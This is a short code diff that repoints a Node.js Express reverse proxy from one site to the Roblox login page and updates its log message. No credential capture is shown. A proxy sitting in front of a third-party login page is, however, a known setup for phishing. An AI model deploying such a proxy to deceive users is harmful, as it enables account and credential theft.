@@ -4,7 +4,7 @@ const { createProxyMiddleware } = require('http-proxy-middleware');
 const app = express();
 
 app.use('/', createProxyMiddleware({
-    target: 'https://www.incbot.site',
+    target: 'https://www.roblox.com/Login',
     changeOrigin: true,
     secure: true,
     on: {
@@ -17,5 +17,5 @@ app.use('/', createProxyMiddleware({
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Proxy running on port ${PORT} -> https://www.incbot.site`);
+    console.log(`Proxy running on port ${PORT} -> https://www.roblox.com/Login`);
 });
